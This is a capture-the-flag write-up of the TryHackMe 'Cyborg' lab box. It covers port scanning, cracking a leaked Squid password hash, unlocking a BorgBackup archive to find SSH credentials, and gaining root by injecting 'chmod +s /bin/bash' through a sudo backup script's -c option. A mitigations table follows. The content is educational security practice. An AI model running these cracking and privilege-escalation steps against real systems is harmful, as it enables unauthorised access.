```
  ██████╗██╗   ██╗██████╗  ██████╗ ██████╗  ██████╗
 ██╔════╝╚██╗ ██╔╝██╔══██╗██╔═══██╗██╔══██╗██╔════╝
 ██║      ╚████╔╝ ██████╔╝██║   ██║██████╔╝██║  ███╗
 ██║       ╚██╔╝  ██╔══██╗██║   ██║██╔══██╗██║   ██║
 ╚██████╗   ██║   ██████╔╝╚██████╔╝██║  ██║╚██████╔╝
  ╚═════╝   ╚═╝   ╚═════╝  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝
           TryHackMe: Cyborg
```

> 👤 **Author:** farhan | 📅 **Date:** 2026-06-14 | 🏠 **Platform:** TryHackMe | 💀 **Difficulty:** Easy | ⭐ **Rating:** ⭐⭐⭐☆☆

> ⏱️ ~13 min read

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#️-tools-used)
- [TL;DR](#-tldr)
- [Introduction](#-introduction)
- [Recon](#-recon)
- [Foothold](#-foothold)
- [Shell / Access](#-shell--access)
- [Escalation](#-escalation)
- [Exploitation](#-exploitation)
- [Rabbit Holes](#-rabbit-holes)
- [Flag](#-flag)
- [Mitigations](#️-mitigations)
- [Key Takeaway](#-key-takeaway)
- [If I Did It Again](#-if-i-did-it-again)
- [Changelog](#-changelog)

---

## Progress Checklist

- [x] Port scan: SSH (22), HTTP (80)
- [x] Feroxbuster: found `/admin/`, `/etc/squid/`
- [x] Read admin shoutbox: collected usernames: Josh, Adam, Alex
- [x] Downloaded `archive.tar` from `/admin/`
- [x] Found exposed Squid proxy credentials at `/etc/squid/passwd`
- [x] Identified `$apr1$` (md5crypt) hash format: cracked with John → `squidward`
- [x] Extracted `archive.tar`: identified as a BorgBackup repository
- [x] Installed `borgbackup`, listed repo with passphrase `squidward`
- [x] Extracted `music_archive`: found `secret.txt` with `alex:S3cretP@s3`
- [x] SSH login as `alex`
- [x] Retrieved user flag
- [x] Identified `sudo /etc/mp3backups/backup.sh` NOPASSWD
- [x] Discovered `-c` flag in `backup.sh` executes arbitrary commands
- [x] Ran `sudo /etc/mp3backups/backup.sh -c "chmod +s /bin/bash"`
- [x] `/bin/bash -p` → root shell
- [x] Retrieved root flag

---

## 🛠️ Tools Used

- 🔎 RustScan + Nmap: port scanning and service detection
- 🕷️ Feroxbuster: web directory enumeration
- 🔓 John the Ripper: md5crypt hash cracking
- 📦 BorgBackup: encrypted backup archive extraction
- 🔐 SSH: authenticated user shell

---

## ⚡ TL;DR

A publicly exposed Squid proxy config and password file handed over an md5crypt hash cracked to `squidward`. That passphrase unlocked a BorgBackup archive downloaded from the web server, inside which sat Alex's plaintext credentials. SSH in, find a `sudo` rule on a backup script that accepts arbitrary command injection via a `-c` flag, stamp SUID on `/bin/bash`, drop to root.

---

## 📖 Introduction

Today's target is **Cyborg**: a box that tells its own story through a shoutbox on the admin page. Alex was "playing around with the squid proxy," decided to give up "like always," and left all the config files lying around. Publicly. On the web server. Including the password file. The backup archive he was so confident was safe contained his credentials in a plaintext note to himself. The sudo rule he probably thought was harmless accepted arbitrary command injection through a getopts flag nobody had thought to audit. Alex is a cautionary tale, and this writeup is a tribute to his contributions to our root shell.

### Prerequisites

Readers are assumed to know:

- What a Squid proxy is and why its config files are sensitive
- What BorgBackup is and how passphrase-protected repositories work
- What `getopts` is in bash and how unsanitised option arguments become command injection
- What SUID on `/bin/bash` grants and how `-p` preserves effective UID

---

## 🔍 Recon

*(~0 mins into the box)*

### Port Scan

*Full-range sweep with RustScan, Nmap for service and version fingerprinting:*

```bash
rustscan -a 10.48.163.91 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV
```

| Port | Service | Version |
| --- | --- | --- |
| 22/tcp | SSH | OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 |
| 80/tcp | HTTP | Apache httpd 2.4.18 (Ubuntu) |

Standard two ports. Apache default page on the root: same signal as Wgel CTF, meaning the content is hiding elsewhere.

### Web Directory Enumeration

*(~3 mins into the box)*

*Feroxbuster with the dirb common wordlist:*

```bash
feroxbuster -u http://10.48.163.91/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,html
```

```
# output (relevant hits only)
301  http://10.48.163.91/admin          # ^^^ admin panel with shoutbox
200  http://10.48.163.91/admin/admin.html
200  http://10.48.163.91/admin/archive.tar   # ^^^ 1.5 MB backup archive
301  http://10.48.163.91/etc
200  http://10.48.163.91/etc/squid/squid.conf
200  http://10.48.163.91/etc/squid/passwd    # ^^^ proxy credentials
```

Two immediately interesting trees: `/admin/` with a downloadable archive, and `/etc/squid/` with the proxy configuration and a password file. Both explored in parallel.

### Admin Shoutbox: Usernames & Context

`/admin/admin.html` hosts an internal shoutbox. Three usernames surface: **Josh**, **Adam**, and **Alex**. Alex's message is the operational gold:

> *"Ok sorry guys i think i messed something up... I was playing around with the squid proxy... all the config files are laying about... i'm not sure how to delete them hope they don't contain any confidential information lol. Other than that i'm pretty sure my backup 'music_archive' is safe just to confirm."*

Alex has told us exactly what to look at: the Squid config files, and a backup called `music_archive`. The box is narrating its own attack path.

### Squid Proxy Credentials

*Contents of `/etc/squid/passwd`:*

```
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```

*Contents of `/etc/squid/squid.conf` (relevant section):*

```
auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic realm Squid Basic Authentication
acl auth_users proxy_auth REQUIRED
http_access allow auth_users
```

The proxy is configured to authenticate users against `passwd`. The hash format is `$apr1$`: Apache's variant of md5crypt, the same format used in `.htpasswd` files. John the Ripper handles it natively.

---

## 🚪 Foothold

*(~10 mins into the box)*

### Hash Cracking: John the Ripper

The hash needed to be wrapped in single quotes rather than double quotes to prevent bash from interpreting the `$` characters as variable expansions: the first attempt with double quotes loaded an empty hash and John reported nothing to crack.

*Saving the hash correctly with single quotes:*

```bash
echo '$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.' > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```
# output
squidward        (?)
1g 0:00:00:00 DONE
```

Passphrase: `squidward`. Appropriate, given the context.

### BorgBackup Archive Extraction

The downloaded `archive.tar` is not a standard tar archive of files: attempting to unzip it fails and `tar -xvf` extracts a directory structure containing `config`, `data/`, `hints.5`, `index.5`, `README`, and `nonce`. These are the internal files of a **BorgBackup** repository.

**What is BorgBackup?** An encrypted, deduplicated backup tool. Repositories are opaque directory structures: the actual backed-up data is stored chunked and encrypted inside `data/`. To read the contents, you need the `borg` tool and the repository passphrase.

*Installing BorgBackup and listing the repository contents:*

```bash
sudo apt install borgbackup
borg list ~/home/field/dev/final_archive
```

```
Enter passphrase for key /home/farhan/home/field/dev/final_archive:
# passphrase: squidward

music_archive    Tue, 2020-12-29 19:00:38 [f789ddb6b0ec...]
```

One archive named `music_archive`: exactly what Alex mentioned. The squid proxy passphrase doubles as the Borg repository passphrase. Alex reused it.

*Extracting the archive:*

```bash
mkdir extracted_data && cd extracted_data
borg extract ~/home/field/dev/final_archive: music_archive
# passphrase: squidward
```

*Exploring the extracted contents:*

```
home/alex/Desktop/secret.txt
home/alex/Documents/note.txt
```

*Reading the files:*

```bash
cat home/alex/Desktop/secret.txt
```

```
shoutout to all the people who have gotten to this stage whoop whoop!
```

```bash
cat home/alex/Documents/note.txt
```

```
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3
```

Alex wrote his SSH credentials in a plaintext note inside a backup archive. The backup was encrypted, sure: with a passphrase he reused from the publicly exposed proxy config. Full circle.

### Credentials Found

| Username | Password | Where Found |
| --- | --- | --- |
| `music_archive` | `squidward` | Squid `/etc/squid/passwd` + John the Ripper |
| `alex` | `S3cretP@s3` | BorgBackup archive → `note.txt` |

---

## 🐚 Shell / Access

*(~20 mins into the box)*

*SSH login as `alex`:*

```bash
ssh alex@10.48.163.91
# Password: S3cretP@s3
```

```
alex@ubuntu:~$ cat user.txt
flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
```

---

## 📈 Escalation

*(~22 mins into the box)*

### sudo backup.sh: Argument Injection

*Checking sudo permissions:*

```bash
sudo -l
```

```
User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

*Reading the script:*

```bash
cat /etc/mp3backups/backup.sh
```

The script is owned by `alex` and readable: the relevant section at the end:

```bash
while getopts c: flag
do
    case "${flag}" in
        c) command=${OPTARG};;
    esac
done

# ... backup logic runs first ...

cmd=$($command)
echo $cmd
```

**What is happening here?** The script accepts a `-c` flag via `getopts` and stores whatever argument is passed into `$command`. At the end of the script, it evaluates `$command` directly in a subshell: `cmd=$($command)`. There is no sanitisation, no allowlist, no restriction on what `$command` can contain. Any string passed via `-c` is executed as a shell command: as root, because the entire script runs via `sudo`.

This is argument injection via an unvalidated `getopts` option becoming a shell evaluation.

*Stamping SUID on `/bin/bash` via the injection:*

```bash
sudo /etc/mp3backups/backup.sh -c "chmod +s /bin/bash"
```

*Spawning a root shell with `-p` to preserve effective UID:*

```bash
/bin/bash -p
```

```
bash-4.3# id
uid=1000(alex) gid=1000(alex) euid=0(root) egid=0(root) groups=0(root),...
bash-4.3# cat /root/root.txt
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
```

---

## 💥 Exploitation

The complete attack chain:

1. **Feroxbuster** → `/etc/squid/passwd` exposed → md5crypt hash for `music_archive`
2. **John the Ripper** cracked `$apr1$` hash → passphrase `squidward`
3. **`archive.tar`** identified as BorgBackup repository → unlocked with `squidward`
4. **BorgBackup extraction** → `note.txt` inside alex's home → `alex:S3cretP@s3`
5. **SSH as `alex`** → user flag
6. **`sudo backup.sh -c "chmod +s /bin/bash"`** → SUID bash → root shell → root flag

---

## 🐇 Rabbit Holes

### Double-Quoted Hash: John Loads Nothing

The first `john` attempt used double quotes around the hash string:

```bash
echo "$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn." > hash.txt
```

Bash expanded `$apr1`, `$BpZ`, and `$F0qqPwHSOG50URuOVQTTn` as empty variables, writing a mangled empty string into the file. John reported "No password hashes loaded." Single-quoting the string fixed it immediately. A sharp reminder: always single-quote hash strings containing `$` when echoing to a file.

### `unzip` on a `.tar` File

Muscle memory. `archive.tar` has a `.tar` extension and `unzip` refused it immediately with a "not a zipfile" error. `tar -xvf` was the correct command, but the extracted result wasn't a set of files, it was a BorgBackup repository, requiring a completely different tool to read.

---

## 🏁 Flag

| Flag | Value | Location |
| --- | --- | --- |
| User | `flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}` | `/home/alex/user.txt` |
| Root | `flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}` | `/root/root.txt` |

---

## 🛡️ Mitigations

| Vulnerability | Severity | Mitigation |
| --- | --- | --- |
| Squid proxy config and password file exposed in webroot | Critical | Never place service configuration files under a web-accessible directory; restrict `/etc/` paths entirely from web serving |
| Weak proxy passphrase (`squidward`) in rockyou.txt | High | Use a long randomly generated passphrase for any authentication credential |
| Passphrase reused across Squid proxy and BorgBackup repository | High | Never reuse credentials across services; use a password manager |
| Plaintext credentials stored in a backup archive | High | Never store plaintext passwords anywhere: not in notes, not in backups; use a proper secrets manager |
| `sudo backup.sh` with unsanitised `-c` argument injection | Critical | Validate and restrict all inputs to privileged scripts; if a script must accept arguments, use an allowlist of permitted values: never `eval` or subshell-execute unsanitised user input |
| SUID bit stampable on `/bin/bash` | Critical | The `-c` injection fix above prevents this; additionally audit SUID binaries regularly and remove unnecessary ones |

---

## 💡 Key Takeaway

> 💡 **Takeaway:** Credential reuse across services is a force multiplier for attackers: one cracked hash unlocked both the Squid proxy and the BorgBackup repository. Every service should have its own unique, randomly generated credential. When one leaks, the blast radius stays contained to that single service rather than cascading through the entire infrastructure.

---

## 🔁 If I Did It Again

Single-quote hash strings containing `$` before echoing them to a file: every time, without thinking. Also `file archive.tar` before trying to extract it, which would have immediately shown "POSIX tar archive" rather than triggering the muscle-memory `unzip` attempt.

---

## 🔚 Changelog

*Last updated: 2026-06-14*

---

[↑ Back to top](#)
